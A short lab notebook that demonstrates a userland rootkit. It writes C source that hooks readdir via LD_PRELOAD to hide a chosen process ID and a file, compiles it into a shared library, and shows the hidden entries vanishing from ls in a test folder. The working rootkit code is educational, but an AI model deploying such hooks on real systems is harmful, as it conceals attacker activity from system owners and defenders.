# Userland Rootkit via LD_PRELOAD

> **Authorized lab use only.** This notebook is an educational demonstration. Run it only with synthetic data or systems you own and are permitted to test.


In [ ]:
# Step 1: Write rootkit source to disk
with open("rootkit.c", "w") as f:
    f.write(r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <dlfcn.h>

const char *HIDE_PROC = "12345";
const char *HIDE_FILE = "secret.txt";

struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) original_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDE_PROC) == 0) continue;
        if (strcmp(entry->d_name, HIDE_FILE) == 0) continue;
        return entry;
    }
    return NULL;
}
''')

# Step 2: Compile rootkit
!gcc -fPIC -shared -o rootkit.so rootkit.c -ldl

# Step 3: Create test environment
!mkdir -p test_env && cd test_env && touch file1.txt secret.txt && mkdir 12345

# Step 4: List directory normally
print("Normal ls:")
!ls test_env

# Step 5: Load rootkit via LD_PRELOAD
import os
os.environ["LD_PRELOAD"] = os.path.abspath("rootkit.so")

print("\nWith rootkit (LD_PRELOAD):")
os.system("ls test_env")

# Step 6: Cleanup
del os.environ["LD_PRELOAD"]
